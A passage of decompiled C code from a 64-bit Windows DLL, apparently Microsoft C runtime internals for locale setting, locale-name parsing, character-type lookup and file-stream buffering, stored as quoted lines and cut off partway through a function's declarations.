    "XSAVE_FORMAT *__fastcall sub_180027440(__int64 a1, __int64 a2, _WORD *a3)",
    "{",
    "  _WORD *v3; // rbx",
    "  __int64 v4; // rdi",
    "  XSAVE_FORMAT *result; // rax",
    "  int v6; // ebp",
    "  int v7; // esi",
    "  _WORD *v8; // rax",
    "  _WORD *v9; // r14",
    "  __int64 v10; // rbp",
    "  int v11; // r12d",
    "  wchar_t **v12; // r15",
    "  __int64 v13; // rax",
    "  _WORD *v14; // r14",
    "  __int64 v15; // rax",
    "  __int64 v16; // rbx",
    "  _WORD *v17; // rbx",
    "  int v18; // ebx",
    "  _QWORD *v19; // r14",
    "  unsigned __int16 *v20; // rax",
    "  int v21; // r8d",
    "  int v22; // ecx",
    "  _DWORD v23[4]; // [rsp+30h] [rbp-218h] BYREF",
    "  _WORD v24[136]; // [rsp+40h] [rbp-208h] BYREF",
    "  _BYTE v25[176]; // [rsp+150h] [rbp-F8h] BYREF",
    "",
    "  v3 = a3;",
    "  v4 = a1;",
    "  if ( (_DWORD)a2 )",
    "  {",
    "    if ( a3 )",
    "      return (XSAVE_FORMAT *)wsetlocale_set_cat(a1, a2, a3);",
    "    else",
    "      return *(XSAVE_FORMAT **)(32LL * (int)a2 + a1 + 40);",
    "  }",
    "  v6 = 1;",
    "  v7 = 0;",
    "  if ( !a3 )",
    "    return sub_180027254(a1);",
    "  if ( *a3 != 76 || a3[1] != 67 || a3[2] != 95 )",
    "  {",
    "    result = (XSAVE_FORMAT *)sub_180026CC8((char *)a3, (__int64)v24, 131, (__int64)v25, 85, v23);",
    "    if ( !result )",
    "      return result;",
    "    v18 = 0;",
    "    v19 = (_QWORD *)(v4 + 40);",
    "    do",
    "    {",
    "      if ( v18 )",
    "      {",
    "        v20 = v24;",
    "        do",
    "        {",
    "          v21 = *(unsigned __int16 *)((char *)v20 + *v19 - (_QWORD)v24);",
    "          v22 = *v20 - v21;",
    "          if ( v22 )",
    "            break;",
    "          ++v20;",
    "        }",
    "        while ( v21 );",
    "        if ( !v22 || wsetlocale_set_cat(v4, (unsigned int)v18, v24) )",
    "          ++v7;",
    "        else",
    "          v6 = 0;",
    "      }",
    "      ++v18;",
    "      v19 += 4;",
    "    }",
    "    while ( v18 <= 5 );",
    "    if ( !v6 )",
    "    {",
    "LABEL_27:",
    "      if ( !v7 )",
    "        return 0;",
    "    }",
    "    a1 = v4;",
    "    return sub_180027254(a1);",
    "  }",
    "  while ( 1 )",
    "  {",
    "    v8 = (_WORD *)sub_180031248(v3, L\"=;\");",
    "    v9 = v8;",
    "    if ( !v8 )",
    "      return 0;",
    "    v10 = v8 - v3;",
    "    if ( !v10 || *v8 == 59 )",
    "      return 0;",
    "    v11 = 1;",
    "    v12 = &off_18003E0B8;",
    "    do",
    "    {",
    "      if ( !(unsigned int)sub_1800232D0(*v12, v3, v10) )",
    "      {",
    "        v13 = -1;",
    "        do",
    "          ++v13;",
    "        while ( (*v12)[v13] );",
    "        if ( v10 == v13 )",
    "          break;",
    "      }",
    "      ++v11;",
    "      v12 += 3;",
    "    }",
    "    while ( (__int64)v12 <= (__int64)&off_18003E118 );",
    "    v14 = v9 + 1;",
    "    v15 = sub_180031208(v14, L\";\");",
    "    v16 = v15;",
    "    if ( !v15 && *v14 != 59 )",
    "      return 0;",
    "    if ( v11 <= 5 )",
    "    {",
    "      if ( (unsigned int)sub_18003110C(v24, 131, v14, v15) )",
    "      {",
    "        sub_18001A6B4();",
    "        __debugbreak();",
    "      }",
    "      if ( (unsigned __int64)(2 * v16) >= 0x106 )",
    "      {",
    "        sub_180012348();",
    "        __debugbreak();",
    "      }",
    "      v24[v16] = 0;",
    "      if ( wsetlocale_set_cat(v4, (unsigned int)v11, v24) )",
    "        ++v7;",
    "    }",
    "    v17 = &v14[v16];",
    "    if ( *v17 )",
    "    {",
    "      v3 = v17 + 1;",
    "      if ( *v3 )",
    "        continue;",
    "    }",
    "    goto LABEL_27;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall wsetlocale_set_cat(_DWORD *a1, int a2, char *a3)",
    "{",
    "  __int64 v4; // r12",
    "  __int64 v6; // r15",
    "  unsigned __int16 *v7; // rcx",
    "  __int64 v8; // rbx",
    "  __int64 result; // rax",
    "  int v10; // r8d",
    "  int v11; // edx",
    "  __int64 v12; // rsi",
    "  XSAVE_FORMAT *v13; // rax",
    "  XSAVE_FORMAT *v14; // r13",
    "  bool v15; // zf",
    "  LPVOID v16; // rax",
    "  int v17; // r8d",
    "  __int64 v18; // rdx",
    "  __int64 v19; // rcx",
    "  __int64 v20; // rax",
    "  unsigned int v21; // ecx",
    "  _WORD *v22; // rax",
    "  BOOL v23; // edx",
    "  _DWORD *v24; // rcx",
    "  int v25; // [rsp+40h] [rbp-C0h] BYREF",
    "  int v26; // [rsp+44h] [rbp-BCh]",
    "  void *v27; // [rsp+48h] [rbp-B8h]",
    "  __int64 v28; // [rsp+50h] [rbp-B0h]",
    "  _WORD v29[136]; // [rsp+60h] [rbp-A0h] BYREF",
    "  __m128i v30[11]; // [rsp+170h] [rbp+70h] BYREF",
    "  _BYTE v31[256]; // [rsp+220h] [rbp+120h] BYREF",
    "",
    "  v4 = a2;",
    "  v6 = sub_1800262FC() + 712;",
    "  if ( !sub_180026CC8(a3, (__int64)v29, 131, (__int64)v30, 85, &v25) )",
    "    return 0;",
    "  v7 = v29;",
    "  v8 = 8 * v4;",
    "  result = *(_QWORD *)&a1[8 * v4 + 10];",
    "  do",
    "  {",
    "    v10 = *(unsigned __int16 *)((char *)v7 + *(_QWORD *)&a1[8 * v4 + 10] - (_QWORD)v29);",
    "    v11 = *v7 - v10;",
    "    if ( v11 )",
    "      break;",
    "    ++v7;",
    "  }",
    "  while ( v10 );",
    "  if ( v11 )",
    "  {",
    "    v12 = -1;",
    "    do",
    "      ++v12;",
    "    while ( v29[v12] );",
    "    v13 = (XSAVE_FORMAT *)sub_180024B50(2 * v12 + 6);",
    "    v14 = v13;",
    "    if ( !v13 )",
    "      return 0;",
    "    v27 = *(void **)&a1[v8 + 10];",
    "    v28 = *(_QWORD *)&a1[2 * v4 + 74];",
    "    v26 = a1[3];",
    "    if ( (unsigned int)sub_18002BA78(&v13->TagWord, v12 + 1, v29) )",
    "    {",
    "      sub_18001A6B4();",
    "      __debugbreak();",
    "    }",
    "    v15 = v29[0] == 67;",
    "    *(_QWORD *)&a1[v8 + 10] = &v14->TagWord;",
    "    if ( !v15 || v29[1] )",
    "      v16 = sub_18002693C(v30);",
    "    else",
    "      v16 = 0;",
    "    *(_QWORD *)&a1[2 * v4 + 74] = v16;",
    "    switch ( (_DWORD)v4 )",
    "    {",
    "      case 2:",
    "        v17 = 0;",
    "        a1[3] = v25;",
    "        v18 = 0;",
    "        v19 = *(_QWORD *)(v6 + 32);",
    "        while ( a1[3] != *(_DWORD *)(v6 + 8 * v18) )",
    "        {",
    "          v20 = *(_QWORD *)(v6 + 8 * v18);",
    "          ++v17;",
    "          *(_QWORD *)(v6 + 8 * v18++) = v19;",
    "          v19 = v20;",
    "          if ( v18 >= 5 )",
    "            goto LABEL_21;",
    "        }",
    "        if ( v17 )",
    "        {",
    "          *(_QWORD *)v6 = *(_QWORD *)(v6 + 8LL * v17);",
    "          *(_QWORD *)(v6 + 8LL * v17) = v19;",
    "        }",
    "LABEL_21:",
    "        if ( v17 == 5 )",
    "        {",
    "          if ( (unsigned int)sub_18002B51C(0, 1, &unk_18003E020, 127, v31, a1[3], 1) )",
    "          {",
    "            v21 = 0;",
    "            v22 = v31;",
    "            do",
    "            {",
    "              ++v21;",
    "              *v22++ &= 0x1FFu;",
    "            }",
    "            while ( v21 < 0x7F );",
    "            v23 = sub_180036C40(v31, off_18004B330, 254) == 0;",
    "          }",
    "          else",
    "          {",
    "            v23 = 0;",
    "          }",
    "          v24 = (_DWORD *)(v6 + 4);",
    "          *(_DWORD *)(v6 + 4) = v23;",
    "          *(_DWORD *)v6 = a1[3];",
    "        }",
    "        else",
    "        {",
    "          v24 = (_DWORD *)(v6 + 4);",
    "        }",
    "        a1[7] = *v24;",
    "        break;",
    "      case 1:",
    "        a1[5] = v25;",
    "        break;",
    "      case 5:",
    "        a1[6] = v25;",
    "        break;",
    "    }",
    "    if ( ((unsigned int (__fastcall *)(_DWORD *))*(&off_18003E0B0 + 3 * v4))(a1) )",
    "    {",
    "      *(_QWORD *)&a1[v8 + 10] = v27;",
    "      sub_180023374(*(XSAVE_FORMAT **)&a1[2 * v4 + 74]);",
    "      *(_QWORD *)&a1[2 * v4 + 74] = v28;",
    "      sub_180023374(v14);",
    "      a1[3] = v26;",
    "      return 0;",
    "    }",
    "    if ( v27 != &unk_18004B4A8 && _InterlockedExchangeAdd(*(volatile signed __int32 **)&a1[v8 + 14], 0xFFFFFFFF) == 1 )",
    "    {",
    "      sub_180023374(*(XSAVE_FORMAT **)&a1[v8 + 14]);",
    "      sub_180023374(*(XSAVE_FORMAT **)&a1[v8 + 12]);",
    "      sub_180023374(*(XSAVE_FORMAT **)&a1[2 * v4 + 74]);",
    "      *(_QWORD *)&a1[v8 + 10] = 0;",
    "      *(_QWORD *)&a1[2 * v4 + 74] = 0;",
    "    }",
    "    *(_DWORD *)&v14->ControlWord = 1;",
    "    result = *(_QWORD *)&a1[v8 + 10];",
    "    *(_QWORD *)&a1[v8 + 14] = v14;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char __fastcall sub_180027A1C(__int64 a1, unsigned __int16 *a2)",
    "{",
    "  char *v4; // r12",
    "  unsigned __int64 v5; // rdi",
    "  char v6; // si",
    "  int i; // r15d",
    "  __int64 v8; // rax",
    "  unsigned __int16 *v9; // r14",
    "  int v10; // eax",
    "  unsigned __int64 v11; // rdi",
    "  unsigned __int64 v12; // rdi",
    "  unsigned __int64 v13; // rdi",
    "  char *v14; // rdx",
    "  char v16[8]; // [rsp+20h] [rbp-49h] BYREF",
    "  char v17; // [rsp+28h] [rbp-41h] BYREF",
    "  _BYTE v18[24]; // [rsp+38h] [rbp-31h] BYREF",
    "  _BYTE v19[24]; // [rsp+50h] [rbp-19h] BYREF",
    "  char v20; // [rsp+68h] [rbp-1h] BYREF",
    "",
    "  sub_1800368A0(a1, 0, 458);",
    "  v4 = &v17;",
    "  v5 = 0;",
    "  v6 = 1;",
    "LABEL_2:",
    "  while ( 2 )",
    "  {",
    "    for ( i = 0; ; i = 2 )",
    "    {",
    "      if ( v5 >= 4 )",
    "        return 0;",
    "      if ( i == 2 )",
    "      {",
    "        v8 = -1;",
    "        do",
    "          ++v8;",
    "        while ( a2[v8] );",
    "      }",
    "      else",
    "      {",
    "        v8 = sub_180031208(a2, L\"-_.\");",
    "      }",
    "      *((_QWORD *)v4 - 1) = a2;",
    "      ++v5;",
    "      v9 = &a2[v8];",
    "      *(_QWORD *)v4 = v8;",
    "      v10 = *v9;",
    "      a2 = v9 + 1;",
    "      *((_DWORD *)v4 + 2) = i;",
    "      v4 += 24;",
    "      if ( !v10 )",
    "        goto LABEL_12;",
    "      if ( v10 == 45 )",
    "        goto LABEL_2;",
    "      if ( v10 != 46 )",
    "        break;",
    "    }",
    "    if ( v10 == 95 )",
    "      continue;",
    "    break;",
    "  }",
    "LABEL_12:",
    "  v11 = v5 - 1;",
    "  if ( !v11 )",
    "    return sub_180027C60(a1, v16);",
    "  v12 = v11 - 1;",
    "  if ( !v12 )",
    "  {",
    "    if ( !(unsigned __int8)sub_180027C60(a1, v16) )",
    "      return 0;",
    "    if ( (unsigned __int8)sub_180027DE0(a1, v18) || (unsigned __int8)sub_180027CEC(a1, v18) )",
    "      return v6;",
    "    v14 = v18;",
    "LABEL_31:",
    "    if ( (unsigned __int8)sub_180027C18(a1, v14) )",
    "      return v6;",
    "    return 0;",
    "  }",
    "  v13 = v12 - 1;",
    "  if ( !v13 )",
    "  {",
    "    if ( !(unsigned __int8)sub_180027C60(a1, v16) )",
    "      return 0;",
    "    if ( (unsigned __int8)sub_180027DE0(a1, v18)",
    "      && ((unsigned __int8)sub_180027CEC(a1, v19) || (unsigned __int8)sub_180027C18(a1, v19)) )",
    "    {",
    "      return v6;",
    "    }",
    "    if ( !(unsigned __int8)sub_180027CEC(a1, v18) )",
    "      return 0;",
    "    v14 = v19;",
    "    goto LABEL_31;",
    "  }",
    "  if ( v13 == 1 )",
    "  {",
    "    if ( !(unsigned __int8)sub_180027C60(a1, v16)",
    "      || !(unsigned __int8)sub_180027DE0(a1, v18)",
    "      || !(unsigned __int8)sub_180027CEC(a1, v19) )",
    "    {",
    "      return 0;",
    "    }",
    "    v14 = &v20;",
    "    goto LABEL_31;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "char __fastcall sub_180027C18(__int64 a1, __int64 a2)",
    "{",
    "  if ( *(_DWORD *)(a2 + 16) != 2 )",
    "    return 0;",
    "  if ( (unsigned int)sub_18003110C(a1 + 256, 16, *(_QWORD *)a2, *(_QWORD *)(a2 + 8)) )",
    "  {",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x180027C5ELL);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180027C60(__int64 a1, _QWORD *a2)",
    "{",
    "  if ( *((_DWORD *)a2 + 4) || (unsigned __int64)(a2[1] - 2LL) > 1 || !(unsigned __int8)sub_180027E70(*a2) )",
    "    return 0;",
    "  if ( (unsigned int)sub_18003110C(a1, 64, *a2, a2[1]) || (unsigned int)sub_18003110C(a1 + 288, 85, *a2, a2[1]) )",
    "  {",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x180027CE8LL);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180027CEC(__int64 a1, _QWORD *a2)",
    "{",
    "  __int64 v4; // r14",
    "  __int64 v5; // rdi",
    "  __int64 v6; // rsi",
    "  __int64 v7; // rax",
    "",
    "  if ( *((_DWORD *)a2 + 4) )",
    "    return 0;",
    "  if ( a2[1] != 2 || !(unsigned __int8)sub_180027E70(*a2) )",
    "  {",
    "    if ( a2[1] == 3 )",
    "    {",
    "      v4 = *a2;",
    "      v5 = 0;",
    "      while ( 1 )",
    "      {",
    "        v6 = *(unsigned __int16 *)(v4 + 2 * v5);",
    "        v7 = sub_180020DB4();",
    "        if ( (unsigned __int16)v6 > 0xFFu || (*(_WORD *)(v7 + 2 * v6) & 4) == 0 )",
    "          break;",
    "        if ( (unsigned __int64)++v5 >= 3 )",
    "          goto LABEL_9;",
    "      }",
    "    }",
    "    return 0;",
    "  }",
    "LABEL_9:",
    "  if ( (unsigned int)sub_18003110C(a1 + 128, 64, *a2, a2[1])",
    "    || (unsigned int)sub_180031014(a1 + 288, 85, \"-\", 1)",
    "    || (unsigned int)sub_180031014(a1 + 288, 85, *a2, a2[1]) )",
    "  {",
    "    sub_18001A6B4();",
    "    __debugbreak();",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180027DE0(__int64 a1, _QWORD *a2)",
    "{",
    "  if ( *((_DWORD *)a2 + 4) || a2[1] != 4 || !(unsigned __int8)sub_180027E70(*a2) )",
    "    return 0;",
    "  if ( (unsigned int)sub_180031014(a1 + 288, 85, \"-\", 1) || (unsigned int)sub_180031014(a1 + 288, 85, *a2, a2[1]) )",
    "  {",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x180027E6ELL);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180027E70(__int64 a1, unsigned __int64 a2)",
    "{",
    "  __int64 v2; // rbx",
    "  __int64 v5; // rsi",
    "  __int64 v6; // rdx",
    "",
    "  v2 = 0;",
    "  if ( !a2 )",
    "    return 1;",
    "  while ( 1 )",
    "  {",
    "    v5 = *(unsigned __int16 *)(a1 + 2 * v2);",
    "    v6 = sub_180020DB4();",
    "    if ( (unsigned __int16)v5 > 0xFFu || (*(_WORD *)(v6 + 2 * v5) & 0x103) == 0 )",
    "      break;",
    "    if ( ++v2 >= a2 )",
    "      return 1;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180027EDC(WCHAR a1, unsigned __int16 a2)",
    "{",
    "  int v2; // ebx",
    "  unsigned int v3; // eax",
    "  wchar_t CharType; // [rsp+30h] [rbp+8h] BYREF",
    "  WCHAR SrcStr; // [rsp+40h] [rbp+18h] BYREF",
    "",
    "  v2 = a2;",
    "  if ( a1 != 0xFFFF )",
    "  {",
    "    if ( a1 < 0x100u )",
    "    {",
    "      v3 = *((unsigned __int16 *)off_18004B2C8 + a1);",
    "      return v2 & v3;",
    "    }",
    "    SrcStr = a1;",
    "    CharType = 0;",
    "    if ( GetStringTypeW(1u, &SrcStr, 1, &CharType) )",
    "    {",
    "      v3 = CharType;",
    "      return v2 & v3;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180027F48(int a1, int a2, __int128 *a3)",
    "{",
    "  __int64 v4; // rdi",
    "  unsigned int v5; // eax",
    "  __int64 v6; // r9",
    "  __int64 result; // rax",
    "  char v8; // [rsp+40h] [rbp-40h] BYREF",
    "  char v9; // [rsp+41h] [rbp-3Fh]",
    "  char v10; // [rsp+42h] [rbp-3Eh]",
    "  __int64 v11; // [rsp+48h] [rbp-38h] BYREF",
    "  __int64 v12; // [rsp+50h] [rbp-30h] BYREF",
    "  char v13; // [rsp+60h] [rbp-20h]",
    "  int v14; // [rsp+68h] [rbp-18h] BYREF",
    "  __int16 v15; // [rsp+6Ch] [rbp-14h]",
    "",
    "  v4 = a1;",
    "  sub_18001B674(&v11, a3);",
    "  if ( (unsigned int)(v4 + 1) <= 0x100 )",
    "  {",
    "    v5 = *(unsigned __int16 *)(*(_QWORD *)v12 + 2 * v4);",
    "    goto LABEL_11;",
    "  }",
    "  if ( *(__int16 *)(*(_QWORD *)v12 + 2LL * BYTE1(v4)) >= 0 )",
    "  {",
    "    v8 = v4;",
    "    v6 = 1;",
    "    v9 = 0;",
    "  }",
    "  else",
    "  {",
    "    v8 = BYTE1(v4);",
    "    v6 = 2;",
    "    v9 = v4;",
    "    v10 = 0;",
    "  }",
    "  v14 = 0;",
    "  v15 = 0;",
    "  if ( (unsigned int)sub_18002B51C(&v12, 1, &v8, v6, &v14, *(_DWORD *)(v12 + 12), 1) )",
    "  {",
    "    v5 = (unsigned __int16)v14;",
    "LABEL_11:",
    "    result = a2 & v5;",
    "    if ( v13 )",
    "      *(_DWORD *)(v11 + 936) &= ~2u;",
    "    return result;",
    "  }",
    "  if ( v13 )",
    "    *(_DWORD *)(v11 + 936) &= ~2u;",
    "  return 0;",
    "}",
    "",
    "",
    "void sub_180028050()",
    "{",
    "  sub_1800326F8();",
    "  JUMPOUT(0x1800326ECLL);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028064(__int64 a1)",
    "{",
    "  unsigned int v2; // edi",
    "  __int64 v4; // rdi",
    "  unsigned int v5; // ebx",
    "  unsigned int v6; // eax",
    "  int v7; // eax",
    "  __int64 v8; // rbx",
    "  _BYTE *v9; // rdx",
    "  unsigned __int8 *v10; // rax",
    "",
    "  if ( !a1 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return (unsigned int)-1;",
    "  }",
    "  if ( (*(_DWORD *)(a1 + 20) & 0x2000) == 0 || (*(_DWORD *)(a1 + 20) & 0x1000) != 0 )",
    "    return (unsigned int)-1;",
    "  if ( (*(_DWORD *)(a1 + 20) & 2) != 0 )",
    "  {",
    "    _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x10u);",
    "    return (unsigned int)-1;",
    "  }",
    "  _InterlockedOr((volatile signed __int32 *)(a1 + 20), 1u);",
    "  if ( (*(_DWORD *)(a1 + 20) & 0x4C0) == 0 )",
    "    sub_18002840C(a1);",
    "  v4 = *(_QWORD *)(a1 + 8);",
    "  v5 = *(_DWORD *)(a1 + 32);",
    "  *(_QWORD *)a1 = v4;",
    "  v6 = sub_180025DAC(a1);",
    "  v7 = sub_180029F94(v6, v4, v5);",
    "  *(_DWORD *)(a1 + 16) = v7;",
    "  if ( (unsigned int)(v7 + 1) <= 1 )",
    "  {",
    "    _InterlockedOr((volatile signed __int32 *)(a1 + 20), v7 != 0 ? 16 : 8);",
    "    *(_DWORD *)(a1 + 16) = 0;",
    "    return (unsigned int)-1;",
    "  }",
    "  if ( (*(_DWORD *)(a1 + 20) & 6) == 0 )",
    "  {",
    "    if ( (unsigned int)sub_180025DAC(a1) == -1 || (unsigned int)sub_180025DAC(a1) == -2 )",
    "    {",
    "      v9 = &unk_18004B2E0;",
    "    }",
    "    else",
    "    {",
    "      v8 = (__int64)(int)sub_180025DAC(a1) >> 6;",
    "      v9 = (_BYTE *)(qword_18004D870[v8] + 72 * (sub_180025DAC(a1) & 0x3F));",
    "    }",
    "    if ( (v9[56] & 0x82) == 0x82 )",
    "      _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x20u);",
    "  }",
    "  if ( *(_DWORD *)(a1 + 32) == 512 && (*(_DWORD *)(a1 + 20) & 0x40) != 0 && (*(_DWORD *)(a1 + 20) & 0x100) == 0 )",
    "    *(_DWORD *)(a1 + 32) = 4096;",
    "  v10 = *(unsigned __int8 **)a1;",
    "  --*(_DWORD *)(a1 + 16);",
    "  v2 = *v10;",
    "  *(_QWORD *)a1 = v10 + 1;",
    "  return v2;",
    "}",
    "",
    "",
    "bool __fastcall sub_1800281CC(char a1, __int64 a2, __int64 a3)",
    "{",
    "  unsigned int v5; // eax",
    "  int v6; // ebp",
    "  __int64 v7; // rdx",
    "  int v8; // edi",
    "  bool v9; // zf",
    "  _BYTE *v10; // rdx",
    "  char v12; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v12 = a1;",
    "  v5 = sub_180025DAC(a2);",
    "  if ( (*(_DWORD *)(a2 + 20) & 0xC0) == 0 )",
    "    return (unsigned int)sub_180028E38(v5, &v12, 1, a3) == 1;",
    "  v6 = 0;",
    "  v7 = *(_QWORD *)(a2 + 8);",
    "  v8 = *(_DWORD *)a2 - *(_DWORD *)(a2 + 8);",
    "  *(_QWORD *)a2 = v7 + 1;",
    "  *(_DWORD *)(a2 + 16) = *(_DWORD *)(a2 + 32) - 1;",
    "  if ( v8 <= 0 )",
    "  {",
    "    if ( v5 + 2 <= 1 )",
    "      v10 = &unk_18004B2E0;",
    "    else",
    "      v10 = (_BYTE *)(qword_18004D870[(__int64)(int)v5 >> 6] + 72LL * (v5 & 0x3F));",
    "    if ( (v10[56] & 0x20) != 0 && sub_18002942C(v5, 0, 2) == -1 )",
    "    {",
    "      _InterlockedOr((volatile signed __int32 *)(a2 + 20), 0x10u);",
    "      return 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v6 = sub_180028E38(v5, v7, (unsigned int)v8, a3);",
    "  }",
    "  v9 = v6 == v8;",
    "  **(_BYTE **)(a2 + 8) = v12;",
    "  return v9;",
    "}",
    "",
    "",
    "bool __fastcall sub_1800282C4(__int64 a1)",
    "{",
    "  void *v2; // rax",
    "  void *v3; // rbx",
    "  LARGE_INTEGER FileSize; // [rsp+30h] [rbp+8h] BYREF",
    "  LARGE_INTEGER NewFilePointer; // [rsp+38h] [rbp+10h] BYREF",
    "",
    "  if ( (*(_DWORD *)(a1 + 20) & 8) != 0 )",
    "    return 1;",
    "  if ( (*(_DWORD *)(a1 + 20) & 0xC0) != 0 && *(_QWORD *)a1 == *(_QWORD *)(a1 + 8) )",
    "    return 0;",
    "  v2 = (void *)sub_18002E4C8(*(unsigned int *)(a1 + 24));",
    "  v3 = v2;",
    "  if ( v2 == (void *)-1LL || !SetFilePointerEx(v2, 0, &NewFilePointer, 1u) || !GetFileSizeEx(v3, &FileSize) )",
    "    return 0;",
    "  return NewFilePointer.QuadPart == FileSize.QuadPart;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028340(unsigned __int8 a1, __int64 a2, __int64 a3)",
    "{",
    "  bool v7; // al",
    "",
    "  sub_180025DAC(a2);",
    "  if ( (*(_DWORD *)(a2 + 20) & 6) == 0 )",
    "  {",
    "    *(_DWORD *)(a3 + 44) = 9;",
    "LABEL_3:",
    "    *(_BYTE *)(a3 + 48) = 1;",
    "LABEL_4:",
    "    _InterlockedOr((volatile signed __int32 *)(a2 + 20), 0x10u);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  if ( (*(_DWORD *)(a2 + 20) & 0x1000) != 0 )",
    "  {",
    "    *(_DWORD *)(a3 + 44) = 34;",
    "    goto LABEL_3;",
    "  }",
    "  if ( (*(_DWORD *)(a2 + 20) & 1) != 0 )",
    "  {",
    "    v7 = sub_1800282C4(a2);",
    "    *(_DWORD *)(a2 + 16) = 0;",
    "    if ( !v7 )",
    "      goto LABEL_4;",
    "    *(_QWORD *)a2 = *(_QWORD *)(a2 + 8);",
    "    _InterlockedAnd((volatile signed __int32 *)(a2 + 20), 0xFFFFFFFE);",
    "  }",
    "  _InterlockedOr((volatile signed __int32 *)(a2 + 20), 2u);",
    "  _InterlockedAnd((volatile signed __int32 *)(a2 + 20), 0xFFFFFFF7);",
    "  *(_DWORD *)(a2 + 16) = 0;",
    "  if ( (*(_DWORD *)(a2 + 20) & 0x4C0) == 0 && !sub_180025DEC((char *)a2) )",
    "    sub_18002840C(a2);",
    "  if ( !sub_1800281CC(a1, a2, a3) )",
    "    goto LABEL_4;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002840C(__int64 a1)",
    "{",
    "  int v2; // edi",
    "  __int64 result; // rax",
    "",
    "  ++dword_18004D2E0;",
    "  v2 = 4096;",
    "  *(_QWORD *)(a1 + 8) = sub_1800232FC(0x1000u, 1u);",
    "  sub_180023374(0);",
    "  if ( *(_QWORD *)(a1 + 8) )",
    "  {",
    "    _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x40u);",
    "  }",
    "  else",
    "  {",
    "    _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x400u);",
    "    v2 = 2;",
    "    *(_QWORD *)(a1 + 8) = a1 + 28;",
    "  }",
    "  *(_DWORD *)(a1 + 32) = v2;",
    "  result = *(_QWORD *)(a1 + 8);",
    "  *(_DWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)a1 = result;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028478(__int64 a1, unsigned int *a2, int **a3, unsigned int *a4)",
    "{",
    "  void *v6; // rax",
    "  unsigned int v7; // ebx",
    "  DWORD LastError; // ebx",
    "",
    "  sub_18002E1BC(*a2);",
    "  if ( (*(_BYTE *)(qword_18004D870[(__int64)**a3 >> 6] + 72LL * (**a3 & 0x3F) + 56) & 1) == 0 )",
    "    goto LABEL_4;",
    "  v6 = (void *)sub_18002E4C8(**a3);",
    "  v7 = 0;",
    "  if ( !FlushFileBuffers(v6) )",
    "  {",
    "    LastError = GetLastError();",
    "    *(_DWORD *)sub_18001A7EC() = LastError;",
    "LABEL_4:",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "    v7 = -1;",
    "  }",
    "  sub_18002E2A4(*a4);",
    "  return v7;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028504(int a1)",
    "{",
    "  int *v2; // [rsp+20h] [rbp-18h] BYREF",
    "  int v3; // [rsp+40h] [rbp+8h] BYREF",
    "  char v4; // [rsp+48h] [rbp+10h] BYREF",
    "  int v5; // [rsp+50h] [rbp+18h] BYREF",
    "  int v6; // [rsp+58h] [rbp+20h] BYREF",
    "",
    "  v3 = a1;",
    "  if ( a1 == -2 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "  }",
    "  else",
    "  {",
    "    if ( a1 >= 0",
    "      && a1 < (unsigned int)dword_18004DC70",
    "      && (*(_BYTE *)(qword_18004D870[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )",
    "    {",
    "      v5 = a1;",
    "      v6 = a1;",
    "      v2 = &v3;",
    "      return sub_180028478((__int64)&v4, (unsigned int *)&v6, &v2, (unsigned int *)&v5);",
    "    }",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180028598(__int64 a1, int a2, unsigned __int8 *a3, int a4, __int64 a5)",
    "{",
    "  unsigned __int8 *v5; // rsi",
    "  __int64 v6; // r14",
    "  __int64 v8; // r13",
    "  __int64 v9; // r15",
    "  unsigned __int64 v10; // r12",
    "  int v11; // edi",
    "  __int64 v12; // r10",
    "  int v13; // ecx",
    "  __int64 v14; // r9",
    "  int v15; // edx",
    "  int v16; // r12d",
    "  int v17; // edx",
    "  __int64 v18; // r14",
    "  _BYTE *v19; // rcx",
    "  int v20; // r12d",
    "  __int64 v21; // rdx",
    "  __int64 v22; // r8",
    "  __int64 v23; // rcx",
    "  _BYTE *v24; // rdx",
    "  __int64 i; // rdx",
    "  __int64 v26; // r13",
    "  __int64 v27; // r8",
    "  int v28; // r14d",
    "  __int64 v29; // r8",
    "  char v30; // cl",
    "  unsigned __int64 v31; // r8",
    "  unsigned __int8 *v32; // rdx",
    "  __int64 v33; // r9",
    "  DWORD v34; // eax",
    "  unsigned int v35; // r14d",
    "  HANDLE v36; // r12",
    "  unsigned __int8 *v37; // rsi",
    "  __int64 v38; // rdx",
    "  __int64 v39; // r9",
    "  __int16 v41[2]; // [rsp+48h] [rbp-71h] BYREF",
    "  int v42; // [rsp+4Ch] [rbp-6Dh] BYREF",
    "  PCONTEXT NumberOfBytesWritten; // [rsp+50h] [rbp-69h] BYREF",
    "  unsigned __int64 v44; // [rsp+58h] [rbp-61h]",
    "  __int64 v45; // [rsp+60h] [rbp-59h]",
